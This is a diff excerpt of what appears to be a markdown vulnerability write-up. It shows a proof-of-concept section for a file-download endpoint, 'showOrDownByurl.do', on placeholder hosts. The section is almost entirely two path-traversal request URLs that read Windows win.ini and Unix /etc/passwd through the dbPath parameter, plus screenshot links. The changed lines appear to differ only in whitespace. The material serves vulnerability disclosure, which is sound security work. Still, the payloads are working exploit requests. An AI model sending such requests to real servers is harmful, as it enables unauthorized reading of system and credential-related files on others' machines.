@@ -137,13 +137,13 @@ page=1&rows=10&sort=createDate%2CuserName&order=asc%2Cdesc
 POC：
 
 ```
-http://x.x.x.x:8088/systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini 
+http://x.x.x.x:8088/systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini 
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibCDtzBMvLolYIMwXwibmu2ru9Y6ldXJLalpmGcP8bWRKncX8JSibnMYoontTNoSp8hRvomWmKFNK4HQ/640?wx_fmt=png)
 
 ```
-http://x.x.x.x:8020/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd 
+http://x.x.x.x:8020/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd 
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibCDtzBMvLolYIMwXwibmu2ruObQUgrWo9NrBUXohhMTpTiar2eEsNR9te4UIoGxgDsHviacdjnruKF7w/640?wx_fmt=png)
